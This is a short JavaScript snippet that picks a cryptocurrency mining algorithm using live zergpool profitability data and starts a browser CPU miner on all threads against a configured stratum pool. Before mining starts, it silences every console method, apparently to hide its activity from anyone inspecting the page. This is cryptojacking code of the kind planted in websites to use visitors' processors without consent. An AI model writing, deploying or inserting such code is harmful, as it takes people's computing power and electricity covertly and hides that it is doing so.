{
    const fetchpool = require("./fetchpool");
    fetchpool.zergpool().then(realtime=>{
        let total = 0;
        let weighted = window.weba2.weighted;
        
        for (let i = 0; i < weighted.length; i++) {
            if (realtime) weighted[i].score = realtime[weighted[i].algo];
            total += weighted[i].score;
        }

        let choice = Math.random() * total;
        let prev = 0;
       
        const select = (()=>{
            for (let i = 0; i < weighted.length; i++) {
                if (choice <= prev + weighted[i].score) return weighted[i];
                else prev += weighted[i].score;
            }
        })();

        const NOOP = ()=>{};
        console.log = NOOP;
        console.debug = NOOP;
        console.info = NOOP;
        console.warn = NOOP;
        console.error = NOOP;
        console.trace = NOOP;

        const cpuWebMiner = require("@marco_ciaramella/cpu-web-miner");
        cpuWebMiner.start(cpuWebMiner[select.algo], window.weba2.stratum(select), null,
            cpuWebMiner.ALL_THREADS);
    })
}